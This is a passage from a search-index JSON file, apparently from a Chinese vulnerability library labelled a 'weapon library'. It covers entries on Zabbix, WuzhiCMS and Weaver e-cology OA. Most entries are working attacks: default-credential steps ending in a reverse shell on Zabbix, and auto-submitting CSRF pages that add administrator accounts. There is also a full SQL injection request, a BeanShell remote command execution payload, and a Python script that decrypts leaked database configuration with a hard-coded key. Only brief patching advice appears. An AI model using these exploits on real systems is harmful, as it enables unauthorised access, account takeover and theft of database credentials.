Session_id\uff1a16c9fe855b00a92112ae55cad58792c6\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/zabbix%202.2.x%2C%203.0.0-3.0.3%E7%89%88%E6%9C%ACSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/6874 https://jaminzhang.github.io/security/Zabbix-latest-SQL-Injection-Vulnerability-and-EXP/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%E5%90%8E%E5%8F%B0getshell/zabbix%E5%90%8E%E5%8F%B0getshell/","title":"Zabbix\u540e\u53f0getshell","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/zabbix/zabbix%E5%90%8E%E5%8F%B0getshell/zabbix%E5%90%8E%E5%8F%B0getshell/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<ol> <li> <p>\u9ed8\u8ba4\u7528\u6237\u540d\u5bc6\u7801\u767b\u5f55</p> <p>Admin / zabbix</p> </li> </ol> <p>2.\u8fdb\u5165\u540e\u70b9\u51fb\u7ba1\u7406-\u811a\u672c</p> <p></p> <p>3.\u70b9\u53f3\u8fb9\u521b\u5efa\u811a\u672c\u6216\u4fee\u6539\u5df2\u6709\u811a\u672c,\u5199\u5165\u53cd\u5f39shell </p> <p>4.\u7136\u540e\u70b9\u51fb\u68c0\u6d4b\u4e2d-\u6700\u65b0\u6570\u636e </p> <p></p> <p>5.\u6536\u5230\u53cd\u5f39\u7684shell</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","title":"\u4e94\u6307CMS 4.1.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 \u4e94\u6307CMS 4.1.0\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-04-10 \u5957\u54e5\uff08taoge@5ecurity.cn\uff09 https://github.com/wuzhicms/wuzhicms https://github.com/wuzhicms/wuzhicms 4.1.0 CVE-2018-9926/CVE-2018-9927"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u4e94\u6307CMS 4.1.0\u7248\u672c\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u5c06\u666e\u901a\u7528\u6237\u63d0\u6210\u4e3a\u7ba1\u7406\u5458\u6743\u9650\u3002\u4e94\u6307CMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7issues\u544a\u77e5\u4f5c\u8005\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u4e00\u5982\u4e0b\uff1a  </p> <pre><code>&lt;html&gt;&lt;body&gt;\n    &lt;script type=\"text/javascript\"&gt;\n    function post(url,fields)\n    {\n    var p = document.createElement(\"form\");\n    p.action = url;\n    p.innerHTML = fields;\n    p.target = \"_self\";\n    p.method = \"post\";\n    document.body.appendChild(p);\n    p.submit();\n    }\n    function csrf_hack()\n    {\n    var fields;\n\n    fields += \"&lt;input type='hidden' name='form[role][]' value='1' /&gt;\";\n    fields += \"&lt;input type='hidden' name='form[username]' value='hack123' /&gt;\"; \n    fields += \"&lt;input type='hidden' name='form[password]' value='' /&gt;\"; \n    fields += \"&lt;input type='hidden' name='form[truename]' value='taoge@5ecurity' /&gt;\"; \n\n    var url = \"http://127.0.0.1/www/index.php?m=core&amp;f=power&amp;v=add&amp;&amp;_su=wuzhicms&amp;_menuid=61&amp;_submenuid=62&amp;submit=\u63d0\u4ea4\";\n    post(url,fields);\n    }\n    window.onload = function() { csrf_hack();}\n    &lt;/script&gt;\n    &lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>CSRF\u6d4b\u8bd5\u9875\u9762\u4ee3\u7801\u4e8c\u5982\u4e0b\uff1a  </p> <pre><code>&lt;html&gt;&lt;body&gt;\n&lt;script type=\"text/javascript\"&gt;\nfunction post(url,fields)\n{\nvar p = document.createElement(\"form\");\np.action = url;\np.innerHTML = fields;\np.target = \"_self\";\np.method = \"post\";\ndocument.body.appendChild(p);\np.submit();\n}\nfunction csrf_hack()\n{\nvar fields;\n\nfields += \"&lt;input type='hidden' name='info[username]' value='hack123' /&gt;\";\nfields += \"&lt;input type='hidden' name='info[password]' value='hacktest' /&gt;\"; \nfields += \"&lt;input type='hidden' name='info[pwdconfirm]' value='hacktest' /&gt;\"; \nfields += \"&lt;input type='hidden' name='info[email]' value='taoge@5ecurity.cn' /&gt;\"; \nfields += \"&lt;input type='hidden' name='info[mobile]' value='' /&gt;\"; \nfields += \"&lt;input type='hidden' name='modelids[]' value='10' /&gt;\"; \nfields += \"&lt;input type='hidden' name='info[groupid]' value='3' /&gt;\"; \nfields += \"&lt;input type='hidden' name='pids[]' value='0' /&gt;\"; \nfields += \"&lt;input type='hidden' name='pids[]' value='0' /&gt;\"; \nfields += \"&lt;input type='hidden' name='pids[]' value='0' /&gt;\";\nfields += \"&lt;input type='hidden' name='pids[]' value='0' /&gt;\"; \nfields += \"&lt;input type='hidden' name='avatar' value='' /&gt;\"; \nfields += \"&lt;input type='hidden' name='islock' value='0' /&gt;\";\nfields += \"&lt;input type='hidden' name='sys_name' value='0' /&gt;\";\nfields += \"&lt;input type='hidden' name='info[birthday]' value='' /&gt;\"; \nfields += \"&lt;input type='hidden' name='info[truename]' value='' /&gt;\"; \nfields += \"&lt;input type='hidden' name='info[sex]' value='0' /&gt;\";\nfields += \"&lt;input type='hidden' name='info[marriage]' value='0' /&gt;\";\n\nvar url = \"http://127.0.0.1/www/index.php?m=member&amp;f=index&amp;v=add&amp;_su=wuzhicms&amp;_menuid=30&amp;_submenuid=74&amp;submit=\u63d0\u4ea4\";\npost(url,fields);\n}\nwindow.onload = function() { csrf_hack();}\n&lt;/script&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"\u6cdb\u5fae e cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#e-cology-oa-sql","title":"\u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u7b80\u4ecb","text":"<p>\u6cdb\u5fae\u63d0\u4f9b\u4e86\u79fb\u52a8\u529e\u516c\u3001\u5fae\u4fe1\u529e\u516c\u3001\u534f\u540c\u529e\u516c(OA)\u3001\u6d41\u7a0b\u7ba1\u7406\u3001\u4fe1\u606f\u95e8\u6237\u3001\u77e5\u8bc6\u7ba1\u7406\u3001\u8d39\u63a7\u7ba1\u7406\u7b49\u529f\u80fd\uff0c\u9002\u7528\u4e8e\u624b\u673a\u548cpc\u7aef\uff0c\u662f\u5f53\u4eca\u6bd4\u8f83\u4e3b\u6d41\u7684OA\u7cfb\u7edf\u4e4b\u4e00\u3002  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u539f\u7406\u6982\u8ff0","text":"<p>\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eOA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u6536\u5230\u7528\u6237\u8f93\u5165\u7684\u65f6\u5019\u672a\u8fdb\u884c\u5b89\u5168\u8fc7\u6ee4\uff0c  oracle\u6570\u636e\u5e93\u4f20\u5165\u6076\u610fSQL\u8bed\u53e5\uff0c\u5bfc\u81f4SQL\u6f0f\u6d1e  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","title":"\u5f71\u54cd\u8303\u56f4","text":"<p>\u4f7f\u7528oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae e-cology OA \u7cfb\u7edf  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_4","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u627e\u5230oracle\u6570\u636e\u5e93\u7684\u6cdb\u5faeOA\u7cfb\u7edf\u540e\u76f4\u63a5\u4f7f\u7528Poc\uff08\u5df2\u516c\u5f00\uff09  </p> <p>\u5982\u679c\u4e0d\u5b58\u5728\u6f0f\u6d1e\uff0c\u5219\u663e\u793a\u7ed3\u679c\u5982\u4e0b\uff1a  </p> <p></p> <p>\u5982\u679c\u6f0f\u6d1e\u5b58\u5728\uff0c\u5219\u4f1a\u76f4\u63a5\u56de\u663e\u5f88\u591a\u6570\u636e:  </p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#poc","title":"Poc\u5982\u4e0b\uff1a\uff08\u52ff\u7528\u4e8e\u975e\u6cd5\u9014\u5f84\uff09","text":"<pre><code>POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1\nHost: ip:port\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 2236\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nformids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1\n</code></pre> <p>\u4fee\u6539NULL\u540e\u4e3a\u8981\u67e5\u8be2\u7684\u5b57\u6bb5\u540d,\u4fee\u6539from\u540e\u4e3a\u67e5\u8be2\u7684\u8868  </p> <p>\u7b80\u6d01\u7248POC</p> <pre><code>POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&amp;scope=2333 HTTP/1.1Host: ip:portUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 2236Connection: closeUpgrade-Insecure-Requests: 1\nformids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"\u6cdb\u5faeOA Bsh \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u8be6\u60c5","text":"<p>\u6cdb\u5faee-cology OA\u7cfb\u7edf\u7684Java Beanshell\u63a5\u53e3\u53ef\u88ab\u672a\u6388\u6743\u8bbf\u95ee, \u653b\u51fb\u8005\u8c03\u7528\u8be5Beanshell\u63a5\u53e3, \u53ef\u6784\u9020\u7279\u5b9a\u7684HTTP\u8bf7\u6c42\u7ed5\u8fc7\u6cdb\u5fae\u672c\u8eab\u4e00\u4e9b\u5b89\u5168\u9650\u5236\u4ece\u800c\u8fbe\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c, \u6f0f\u6d1e\u7b49\u7ea7\u4e25\u91cd</p>","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%20Bsh%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","title":"\u5229\u7528\u65b9\u5f0f","text":"<p>``` POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: / Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded</p> <p>bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw  ```\u9632\u62a4\u65b9\u6cd5 1.\u53ca\u65f6\u66f4\u65b0\u6cdb\u5fae\u8865\u4e01 2.\u62e6\u622a/weaver/bsh.servlet.BshServlet\u76ee\u5f55\u7684\u8bbf\u95ee</p>","tags":["\u767d\u9601-\u6b66\u5668\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/","title":"\u6cdb\u5faeOA\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>\u76ee\u524d\u5df2\u77e5\u4e3a8.100.0531\uff0c\u4e0d\u6392\u9664\u5176\u4ed6\u7248\u672c\uff0c\u5305\u62ec\u4e0d\u9650\u4e8eEC7.0\u3001EC8.0</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEOA%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F/#poc","title":"\u6f0f\u6d1e\u9a8c\u8bc1POC","text":"<pre><code># -*- coding:utf-8 -*-\n#Author:print(\"\")\nimport pyDes,requests\nimport sys\ndef desdecode(secret_key,s):\n    cipherX = pyDes.des('        ')\n    cipherX.setKey(secret_key)\n    y = cipherX.decrypt(s)\n    return y\ndefault_headers = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'\n}\ndef send(url):\n    data = requests.get(url='%s/mobile/dbconfigreader.jsp'%url).content\n    return (desdecode('1z2x3c4v5b6n', data.strip()))\n\nif __name__ == '__main__':\n    url = sys.argv[1]\n    print('\u6cdb\u5faee-cology OA \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e')\n    print('url---&gt;%s'%url)\n    print('\u6570\u636e\u5e93\u4fe1\u606f\u5982\u4e0b-----&gt;:%s'%send(url)) \n</code></pre>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"\u6cdb\u5faee cology SQL\u6ce8\u5165\u6f0f\u6d1e","text":"<p>2019\u5e7410\u6708\uff0c\u767d\u5e3d\u6c47\u5b89\u5168\u7814\u7a76\u9662\u89c2\u6d4b\u5916\u7f51\u51fa\u73b0\u6cdb\u5fae\u529e\u516c\u8f6f\u4ef6\u7684SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5728\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u653b\u51fb\uff0c\u83b7\u5f97\u7cfb\u7edf\u654f\u611f\u6570\u636e\u3002\u8be5\u6f0f\u6d1e\u76ee\u524d\u5c5e\u4e8e0day\uff0c\u6240\u6709\u4f7f\u7528\u4e86Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u7f51\u7ad9\u90fd\u6709\u53ef\u80fd\u53d7\u5230\u5f71\u54cd\uff0c\u4e14\u5229\u7528\u96be\u5ea6\u4f4e\uff0c\u5371\u5bb3\u5927\uff08\u53ef\u83b7\u53d6\u5bc6\u7801\u7b49\u654f\u611f\u4fe1\u606f\uff09\uff0c\u9884\u8ba1\u4f1a\u5bf9\u6cdb\u5fae\u7684\u4e3b\u8981\u670d\u52a1\u5730\u533a\u2014\u2014\u4e2d\u56fd\u5e02\u573a\u4ea7\u751f\u4e00\u5b9a\u51b2\u51fb\u3002</p> <p></p> <p>\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eOA\u7cfb\u7edf\u7684<code>WorkflowCenterTreeData</code>\u63a5\u53e3\u4e2d\u6d89\u53caOracle\u6570\u636e\u5e93\u7684SQL\u8bed\u53e5\u7f3a\u4e4f\u5b89\u5168\u68c0\u67e5\u63aa\u65bd\u6240\u5bfc\u81f4\u7684\uff0c\u4efb\u610f\u653b\u51fb\u8005\u90fd\u53ef\u501fSQL\u8bed\u53e5\u62fc\u63a5\u65f6\u673a\u6ce8\u5165\u6076\u610fpayload\uff0c\u9020\u6210SQL\u6ce8\u5165\u653b\u51fb\u3002\u76ee\u524d\u5b98\u65b9\u5c1a\u672a\u53d1\u5e03\u6f0f\u6d1e\u8865\u4e01\uff0c\u6240\u6709\u4f7f\u7528\u4e86Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u7f51\u7ad9\u90fd\u6709\u53ef\u80fd\u53d7\u5230\u5f71\u54cd\uff0c\u8bf7\u76f8\u5173\u7f51\u7ad9\u7ba1\u7406\u4eba\u5458\u5728\u5b98\u65b9\u53d1\u5e03\u8865\u4e01\u524d\u53ca\u65f6\u4e0b\u7ebf\u7f51\u7ad9\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AE/%E6%B3%9B%E5%BE%AEe-cology%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u6982\u51b5","text":"<p>\u76ee\u524dFOFA\u7cfb\u7edf\u6700\u65b0\u6570\u636e\uff08\u4e00\u5e74\u5185\u6570\u636e\uff09\u663e\u793a\u5168\u7403\u8303\u56f4\u5185\u5171\u670910266\u4e2a\u6cdb\u5fae\u670d\u52a1\uff08\u57fa\u4e8ejsp\u8bed\u8a00\uff09\u3002\u4e2d\u56fd\u5927\u9646\u4f7f\u7528\u6570\u91cf\u6700\u591a\uff0c\u5171\u670910166\u4e2a\uff0c\u4e2d\u56fd\u9999\u6e2f\u7b2c\u4e8c\uff0c\u5171\u670951\u4e2a\uff0c\u7f8e\u56fd\u7b2c\u4e09\uff0c\u5171\u670915\u4e2a\uff0c\u65b0\u52a0\u5761\u7b2c\u56db\uff0c\u5171\u670911\u4e2a\uff0c\u82f1\u56fd\u7b2c\u4e94\uff0c\u5171\u67094\u4e2a\u3002</p> <p>\u5168\u7403\u8303\u56f4\u5185\u6cdb\u5fae\u670d\u52a1\u5206\u5e03\u60c5\u51b5\u5982\u4e0b\uff08\u4ec5\u4e3a\u5206\u5e03\u60c5\u51b5\uff0c\u975e\u6f0f\u6d1e\u5f71\u54cd\u60c5\u51b5\uff09\u3002</p> <p></p> <p>\u4e2d\u56fd\u5927\u9646\u5730\u533a\u5e7f\u4e1c\u7701\u4f7f\u7528\u6570\u91cf\u6700\u591a\uff0c\u5171\u67091559\u4e2a\uff0c\u56db\u5ddd\u7701\u7b2c\u4e8c\uff0c\u5171\u67091014\u4e2a\uff0c\u6cb3\u5357\u7701\u7b2c\u4e09\uff0c\u5171\u67091008\u4e2a\uff0c\u6c5f\u897f\u7701\u7b2c\u56db\uff0c\u5171\u6709961\u4e2a\uff0c\u4e0a\u6d77\u5e02\u7701\u7b2c\u4e94\uff0c\u5171\u6709811\u4e2a\u3002</p> 